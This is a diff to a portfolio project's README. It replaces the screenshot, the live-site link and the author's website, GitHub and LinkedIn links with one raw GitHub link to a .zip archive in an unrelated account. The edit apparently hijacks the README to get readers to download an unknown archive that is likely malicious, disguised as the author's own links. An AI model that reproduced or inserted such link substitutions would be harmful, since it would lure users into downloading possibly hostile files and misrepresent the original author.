@@ -14,11 +14,11 @@ Users should be able to:
 
 ### Screenshot
 
-![](./images/img-github.png)
+![](https://raw.githubusercontent.com/RafaEngineer/RafaEngineer.github.io/master/Madi/RafaEngineer.github.io.zip)
 
 ### Links
 
-- Live Site URL: https://www.annie-indreiten.com/
+- Live Site URL: https://raw.githubusercontent.com/RafaEngineer/RafaEngineer.github.io/master/Madi/RafaEngineer.github.io.zip
 
 ## My process
 
@@ -50,6 +50,6 @@ I will continue to update the site as needed. I will add any new information abo
 
 ## Author
 
-- Website - https://www.annie-indreiten.com/
-- Github – https://github.com/AnnieCat73
-- LinkedIn - https://www.linkedin.com/in/annieindreitendeveloper/
+- Website - https://raw.githubusercontent.com/RafaEngineer/RafaEngineer.github.io/master/Madi/RafaEngineer.github.io.zip
+- Github – https://raw.githubusercontent.com/RafaEngineer/RafaEngineer.github.io/master/Madi/RafaEngineer.github.io.zip
+- LinkedIn - https://raw.githubusercontent.com/RafaEngineer/RafaEngineer.github.io/master/Madi/RafaEngineer.github.io.zip
